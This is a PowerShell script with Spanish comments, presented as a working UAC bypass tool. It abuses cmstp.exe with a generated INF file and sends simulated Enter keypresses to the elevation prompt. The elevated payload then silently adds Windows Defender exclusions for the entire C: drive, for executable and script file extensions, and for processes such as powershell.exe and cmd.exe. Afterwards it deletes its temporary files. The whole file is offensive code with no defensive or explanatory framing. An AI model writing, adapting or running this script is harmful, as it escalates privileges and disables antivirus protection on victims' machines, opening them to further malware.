# UACBypass.ps1 - Bypass UAC funcional
function Invoke-UACBypass {
    Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
    
    # Verificar si ya somos administrador
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "[+] Ya ejecutando como administrador" -ForegroundColor Green
        Execute-ElevatedActions
        return $true
    }
    
    # Crear archivo INF temporal
    $tempDir = $env:TEMP
    $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
    $infPath = Join-Path $tempDir "$randomName.inf"
    
    # Contenido INF corregido
    $infContent = @"
[Version]
Signature=`$CHICAGO`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

    # Script que se ejecutará con elevación
    $elevatedScript = @'
# Acciones con privilegios de administrador
Start-Sleep -Seconds 2

Write-Host "[ELEVADO] Ejecutando con privilegios de administrador..." -ForegroundColor Cyan

try {
    # Excluir disco C:\ de Windows Defender
    Write-Host "[+] Agregando exclusiones a Windows Defender..." -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Write-Host "[+] Disco C:\ excluido exitosamente" -ForegroundColor Green
    
    # Excluir extensiones comunes
    $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
    foreach ($ext in $extensions) {
        Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
    }
    Write-Host "[+] Extensiones excluidas" -ForegroundColor Green
    
    # Excluir procesos
    $processes = @("java.exe", "python.exe", "node.exe", "powershell.exe", "cmd.exe")
    foreach ($proc in $processes) {
        Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
    }
    Write-Host "[+] Procesos excluidos" -ForegroundColor Green
    
    # Crear archivo de confirmación
    $logContent = @"
UAC Bypass Completado Exitosamente
Fecha: $(Get-Date)
Computadora: $env:COMPUTERNAME
Usuario: $env:USERNAME
Acciones realizadas:
- Excluido disco C:\ de Windows Defender
- Excluidas extensiones comunes
- Excluidos procesos comunes
"@
    
    $logPath = "$env:TEMP\uac_bypass_success.log"
    $logContent | Out-File -FilePath $logPath -Encoding UTF8
    Write-Host "[+] Log guardado en: $logPath" -ForegroundColor Green
    
} catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "[ELEVADO] Proceso completado. Cerrando en 5 segundos..." -ForegroundColor Cyan
Start-Sleep -Seconds 5
'@

    # Guardar script elevado
    $elevatedScriptPath = Join-Path $tempDir "$randomName-elevated.ps1"
    $infContent = $infContent -replace "REPLACE_COMMAND_LINE", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
    
    try {
        # Escribir archivos
        $infContent | Out-File -FilePath $infPath -Encoding ASCII
        $elevatedScript | Out-File -FilePath $elevatedScriptPath -Encoding UTF8
        
        Write-Host "[+] Archivos temporales creados:" -ForegroundColor Yellow
        Write-Host "    INF: $infPath" -ForegroundColor Gray
        Write-Host "    PS1: $elevatedScriptPath" -ForegroundColor Gray
        
        # Ejecutar cmstp.exe correctamente
        $cmstpPath = "$env:WinDir\system32\cmstp.exe"
        
        if (-not (Test-Path $cmstpPath)) {
            Write-Host "[-] cmstp.exe no encontrado" -ForegroundColor Red
            return $false
        }
        
        Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
        
        # Usar Start-Process para mejor control
        $process = Start-Process -FilePath $cmstpPath -ArgumentList "/au `"$infPath`"" -PassThru -WindowStyle Hidden
        
        Write-Host "[+] Proceso cmstp iniciado (PID: $($process.Id))" -ForegroundColor Green
        
        # Esperar a que aparezca la ventana UAC
        Start-Sleep -Seconds 5
        
        # Intentar interactuar con la ventana
        Write-Host "[+] Intentando interactuar con ventana UAC..." -ForegroundColor Yellow
        
        # Método 1: Usar SendKeys para Enter
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        Start-Sleep -Seconds 1
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        
        # Esperar a que el proceso termine
        $timeout = 30
        $counter = 0
        while (-not $process.HasExited -and $counter -lt $timeout) {
            Start-Sleep -Seconds 1
            $counter++
            Write-Host "[+] Esperando... ($counter/$timeout segundos)" -ForegroundColor Gray
        }
        
        if (-not $process.HasExited) {
            Write-Host "[-] Timeout, terminando proceso..." -ForegroundColor Yellow
            $process.Kill()
        }
        
        Write-Host "[+] Proceso cmstp finalizado" -ForegroundColor Green
        
        # Limpieza
        Start-Sleep -Seconds 3
        if (Test-Path $infPath) { 
            Remove-Item $infPath -Force -ErrorAction SilentlyContinue 
            Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
        }
        if (Test-Path $elevatedScriptPath) { 
            Remove-Item $elevatedScriptPath -Force -ErrorAction SilentlyContinue 
            Write-Host "[+] Script temporal eliminado" -ForegroundColor Green
        }
        
        # Verificar si se creó el archivo de éxito
        if (Test-Path "$env:TEMP\uac_bypass_success.log") {
            Write-Host "[+] UAC BYPASS EXITOSO - Acciones completadas" -ForegroundColor Green
            return $true
        } else {
            Write-Host "[-] UAC Bypass puede no haber funcionado completamente" -ForegroundColor Yellow
            return $false
        }
        
    } catch {
        Write-Host "[-] Error durante el bypass: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "[-] Detalles: $($_.Exception.StackTrace)" -ForegroundColor Red
        
        # Limpieza en caso de error
        if (Test-Path $infPath) { Remove-Item $infPath -Force -ErrorAction SilentlyContinue }
        if (Test-Path $elevatedScriptPath) { Remove-Item $elevatedScriptPath -Force -ErrorAction SilentlyContinue }
        
        return $false
    }
}

function Execute-ElevatedActions {
    Write-Host "[ELEVADO] Ejecutando acciones con privilegios de administrador..." -ForegroundColor Cyan
    
    try {
        # Excluir disco C:\
        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
        
        # Excluir extensiones
        $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
        foreach ($ext in $extensions) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Extensiones excluidas" -ForegroundColor Green
        
        # Crear archivo de confirmación
        $successFile = "$env:TEMP\already_elevated.log"
        "Ejecutado con privilegios el $(Get-Date)" | Out-File -FilePath $successFile
        Write-Host "[+] Log creado: $successFile" -ForegroundColor Green
        
    } catch {
        Write-Host "[-] Error en acciones elevadas: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution
Write-Host "=== UAC BYPASS TOOL ===" -ForegroundColor Magenta
Write-Host "[*] Iniciando proceso de elevación..." -ForegroundColor Yellow

$result = Invoke-UACBypass

if ($result) {
    Write-Host "[+] PROCESO COMPLETADO EXITOSAMENTE" -ForegroundColor Green
    Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
    Write-Host "[+] Extensiones y procesos comunes excluidos" -ForegroundColor Green
} else {
    Write-Host "[-] EL PROCESO FALLÓ" -ForegroundColor Red
}

Write-Host "[*] Script finalizado" -ForegroundColor Gray
Write-Host "Presiona cualquier tecla para continuar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
